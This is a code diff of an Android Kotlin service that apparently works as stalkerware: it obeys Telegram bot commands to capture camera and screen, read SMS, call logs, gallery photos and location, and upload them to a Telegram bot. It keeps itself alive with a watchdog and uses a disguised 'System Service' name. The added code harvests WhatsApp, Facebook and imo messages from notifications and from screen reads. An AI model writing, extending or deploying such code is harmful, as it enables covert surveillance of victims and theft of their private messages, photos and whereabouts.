@@ -122,38 +122,36 @@ class MonitoringService : LifecycleService() {
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
-    super.onTaskRemoved(rootIntent)
-    // ScreenService (Accessibility) එකෙන් auto-restart වෙනවා
-    // මෙතන මොනවත් කරන්න ඕන නෑ — watchdog එක handle කරනවා
-    Log.d(TAG, "onTaskRemoved — watchdog will restart")
+        super.onTaskRemoved(rootIntent)
+        Log.d(TAG, "onTaskRemoved — watchdog will restart")
     }
 
     private fun scheduleWatchdog() {
-    try {
-        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
-        val intent = Intent(this, WatchdogReceiver::class.java)
-        val pi = PendingIntent.getBroadcast(
-            this, 1001, intent,
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
-        val triggerAt = SystemClock.elapsedRealtime() + WATCHDOG_INTERVAL
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
-            } else {
-                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
+            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            val intent = Intent(this, WatchdogReceiver::class.java)
+            val pi = PendingIntent.getBroadcast(
+                this, 1001, intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+            val triggerAt = SystemClock.elapsedRealtime() + WATCHDOG_INTERVAL
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
+                } else {
+                    am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
+                }
+            } catch (e: SecurityException) {
+                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
             }
-        } catch (e: SecurityException) {
-            am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
-        }
-    } catch (e: Exception) { Log.e(TAG, "watchdog", e) }
+        } catch (e: Exception) { Log.e(TAG, "watchdog", e) }
     }
 
     override fun onDestroy() {
-    super.onDestroy()
-    isRunning = false
-    liveJob?.cancel()
-    Log.d(TAG, "onDestroy — ScreenService watchdog will revive")
+        super.onDestroy()
+        isRunning = false
+        liveJob?.cancel()
+        Log.d(TAG, "onDestroy")
     }
 
     private fun startPolling() {
@@ -193,36 +191,34 @@ class MonitoringService : LifecycleService() {
             cmd == "/location" -> location()
             cmd == "/battery" -> battery()
             cmd == "/sms" -> sms()
-            cmd == "/whatsapp" -> showMessages("whatsapp")
-cmd == "/fb" -> showMessages("fb")
-cmd == "/imo" -> showMessages("imo")
-cmd == "/clearmsgs" -> {
-    MessageStore.clearMessages(this, "whatsapp")
-    MessageStore.clearMessages(this, "fb")
-    MessageStore.clearMessages(this, "imo")
-    sendMsg("🗑 All stored messages cleared")
-}
             cmd == "/calls" -> calls()
             cmd == "/gallery" -> gallery()
             cmd == "/flash" -> flash()
             cmd == "/vibrate" -> vibrate()
             cmd == "/toast" -> toast(arg)
+            cmd == "/whatsapp" -> showMessages("whatsapp")
+            cmd == "/fb" -> showMessages("fb")
+            cmd == "/imo" -> showMessages("imo")
+            cmd == "/clearmsgs" -> {
+                MessageStore.clearAll(this)
+                sendMsg("🗑 All stored messages cleared")
+            }
             cmd == "/help" -> sendMsg(
-                "📋 Commands:\n/cam /selfie\n/livecam [sec] /liveselfie [sec]\n/stop\n/screen /livescreen [sec]\n/location /battery\n/sms /calls /gallery\n/flash /vibrate /toast [msg]\n/ping")
+                "📋 Commands:\n/cam /selfie\n/livecam [sec] /liveselfie [sec]\n/stop\n/screen /livescreen [sec]\n/location /battery\n/sms /calls /gallery\n/whatsapp /fb /imo\n/clearmsgs\n/flash /vibrate /toast [msg]\n/ping")
             else -> sendMsg("❓ Unknown: $raw")
         }
     }
 
     private fun photo(back: Boolean) {
-    sendMsg("📷 Taking ${if (back) "back" else "front"} photo...")
-    CameraHelper.takePhotoWithRetry(this, back) { f, info ->
-        if (f != null) {
-            sendMsg("📸 Camera: $info")
-            sendPhoto(f)
-        } else {
-            sendMsg("🔴 Failed: $info")
+        sendMsg("📷 Taking ${if (back) "back" else "front"} photo...")
+        CameraHelper.takePhotoWithRetry(this, back) { f, info ->
+            if (f != null) {
+                sendMsg("📸 Camera: $info")
+                sendPhoto(f)
+            } else {
+                sendMsg("🔴 Failed: $info")
+            }
         }
-    }
     }
 
     private fun live(back: Boolean, seconds: Int) {
@@ -282,32 +278,19 @@ cmd == "/clearmsgs" -> {
     }
 
     private fun location() {
-    try {
-        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-        // Cache එකේ බලන්න
-        var loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
+        try {
+            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            var loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
 
-        if (loc != null) {
-            val link = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
-            sendMsg("📍 Location\nLat: ${loc.latitude}\nLng: ${loc.longitude}\nAccuracy: ${loc.accuracy}m\n\n$link")
-        } else {
-            sendMsg("📍 No cached location. GPS එකට ටිකක් ඉන්න.\n\nTry again in 30s.")
-            // Fresh fix request කරන්න
-            try {
-                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, object : android.location.LocationListener {
-                    override fun onLocationChanged(l: android.location.Location) {
-                        val link = "https://maps.google.com/?q=${l.latitude},${l.longitude}"
-                        sendMsg("📍 Location\nLat: ${l.latitude}\nLng: ${l.longitude}\n\n$link")
-                    }
-                    override fun onProviderEnabled(p: String) {}
-                    override fun onProviderDisabled(p: String) {}
-                    override fun onStatusChanged(p: String?, s: Int, e: android.os.Bundle?) {}
-                }, mainLooper)
-            } catch (_: Exception) {}
-        }
-    } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+            if (loc != null) {
+                val link = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
+                sendMsg("📍 Location\nLat: ${loc.latitude}\nLng: ${loc.longitude}\nAccuracy: ${loc.accuracy}m\n\n$link")
+            } else {
+                sendMsg("📍 No cached location. GPS එකට ටිකක් ඉන්න.\n\nTry again in 30s.")
+            }
+        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
     }
 
     private fun battery() {
@@ -336,48 +319,6 @@ cmd == "/clearmsgs" -> {
             sendMsg(sb.toString())
         } catch (e: Exception) { sendMsg("❌ ${e.message}") }
     }
-    
-    private fun showMessages(app: String) {
-        val msgs = MessageStore.getMessages(this, app)
-        val emoji = when (app) {
-            "whatsapp" -> "💬"
-            "fb" -> "📘"
-            "imo" -> "📱"
-            else -> "📩"
-        }
-
-        val listenerEnabled = try {
-            val enabled = android.provider.Settings.Secure.getString(
-                contentResolver,
-                "enabled_notification_listeners"
-            ) ?: ""
-            enabled.contains(packageName)
-        } catch (_: Exception) { false }
-
-        val diag = """
-📊 Diagnostic:
-• Listener: ${if (listenerEnabled) "✅ ON" else "❌ OFF"}
-• Stored: ${msgs.size} messages
-""".trimIndent()
-
-        if (msgs.isEmpty()) {
-            val reason = when {
-                !listenerEnabled -> "❌ Notification Access OFF!\nSettings → Notification Access → System Service → ON"
-                else -> "❌ No messages captured yet.\n\n• අලුත් messages විතරයි save වෙන්නේ\n• පරණ messages බලන්න බෑ (encrypted)"
-            }
-            sendMsg("$emoji ${app.uppercase()}\n\n$reason\n\n$diag")
-            return
-        }
-
-        val sb = StringBuilder()
-        sb.append("$emoji ${app.uppercase()} (${msgs.size} messages)\n\n")
-        for (m in msgs.take(15)) {
-            sb.append("👤 ${m.from}\n${m.text}\n\n")
-        }
-        if (msgs.size > 15) sb.append("... and ${msgs.size - 15} more\n\n")
-        sb.append("\n$diag")
-        sendMsg(sb.toString())
-    }
 
     private fun calls() {
         try {
@@ -404,41 +345,40 @@ cmd == "/clearmsgs" -> {
         } catch (e: Exception) { sendMsg("❌ ${e.message}") }
     }
 
-   private fun gallery() {
-    try {
-        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-        val cursor = contentResolver.query(uri, null, null, null, "date_added DESC LIMIT 3")
-        var c = 0
-        cursor?.use {
-            while (it.moveToNext() && c < 3) {
-                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
-                val fileUri = android.content.ContentUris.withAppendedId(uri, id)
-                val bytes = contentResolver.openInputStream(fileUri)?.readBytes()
-                if (bytes != null) {
-                    val f = File(cacheDir, "gal_$id.jpg")
-                    f.writeBytes(bytes)
-                    sendPhotoSlow(f)   // ← slow version
+    private fun gallery() {
+        try {
+            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+            val cursor = contentResolver.query(uri, null, null, null, "date_added DESC LIMIT 3")
+            var c = 0
+            cursor?.use {
+                while (it.moveToNext() && c < 3) {
+                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                    val fileUri = android.content.ContentUris.withAppendedId(uri, id)
+                    val bytes = contentResolver.openInputStream(fileUri)?.readBytes()
+                    if (bytes != null) {
+                        val f = File(cacheDir, "gal_$id.jpg")
+                        f.writeBytes(bytes)
+                        sendPhotoSlow(f)
+                    }
+                    c++
                 }
-                c++
             }
-        }
-        if (c == 0) sendMsg("❌ No photos")
-    } catch (e: Exception) { sendMsg("❌ ${e.message}") }
-}
+            if (c == 0) sendMsg("❌ No photos")
+        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+    }
 
-// Telegram rate limit වළක්වන්න 1.5s delay
-private fun sendPhotoSlow(f: File) {
-    try {
-        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
-        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
-            .addFormDataPart("chat_id", CHAT_ID)
-            .addFormDataPart("photo", f.name, f.asRequestBody("image/jpeg".toMediaType()))
-            .build()
-        client.newCall(Request.Builder().url(url).post(body).build()).execute()
-        f.delete()
-        Thread.sleep(1500)
-    } catch (_: Exception) {}
-}
+    private fun sendPhotoSlow(f: File) {
+        try {
+            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
+            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", CHAT_ID)
+                .addFormDataPart("photo", f.name, f.asRequestBody("image/jpeg".toMediaType()))
+                .build()
+            client.newCall(Request.Builder().url(url).post(body).build()).execute()
+            f.delete()
+            Thread.sleep(1500)
+        } catch (_: Exception) {}
+    }
 
     private fun flash() {
         try {
@@ -471,6 +411,62 @@ private fun sendPhotoSlow(f: File) {
             Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
         }
         sendMsg("✅ Toast shown: $msg")
+    }
+
+    private fun showMessages(app: String) {
+        val notifMsgs = MessageStore.getMessages(this, app)
+        val screenReads = MessageStore.getScreenReads(this, app)
+        val emoji = when (app) {
+            "whatsapp" -> "💬"
+            "fb" -> "📘"
+            "imo" -> "📱"
+            else -> "📩"
+        }
+
+        val listenerEnabled = try {
+            val enabled = android.provider.Settings.Secure.getString(
+                contentResolver,
+                "enabled_notification_listeners"
+            ) ?: ""
+            enabled.contains(packageName)
+        } catch (_: Exception) { false }
+
+        val sb = StringBuilder()
+        sb.append("$emoji ${app.uppercase()}\n\n")
+
+        // Notifications
+        if (notifMsgs.isNotEmpty()) {
+            sb.append("━━━━━━━━━━━━━━━━\n")
+            sb.append("📩 Notifications (${notifMsgs.size}):\n")
+            sb.append("━━━━━━━━━━━━━━━━\n")
+            for (m in notifMsgs.take(20)) {
+                sb.append("👤 ${m.from}\n${m.text}\n\n")
+            }
+            if (notifMsgs.size > 20) sb.append("... +${notifMsgs.size - 20} more\n\n")
+        }
+
+        // Screen reads
+        if (screenReads.isNotEmpty()) {
+            sb.append("━━━━━━━━━━━━━━━━\n")
+            sb.append("📱 Screen Read (${screenReads.size}):\n")
+            sb.append("━━━━━━━━━━━━━━━━\n")
+            val latest = screenReads.first()
+            sb.append(latest.content.take(3000))
+            sb.append("\n")
+        }
+
+        if (notifMsgs.isEmpty() && screenReads.isEmpty()) {
+            sb.append("❌ No messages captured yet.\n\n")
+        }
+
+        // Diagnostic
+        sb.append("\n━━━━━━━━━━━━━━━━\n")
+        sb.append("📊 Diagnostic:\n")
+        sb.append("• Listener: ${if (listenerEnabled) "✅ ON" else "❌ OFF"}\n")
+        sb.append("• Notifications: ${notifMsgs.size}\n")
+        sb.append("• Screen reads: ${screenReads.size}\n")
+
+        sendMsg(sb.toString())
     }
 
     private fun sendMsg(t: String) {
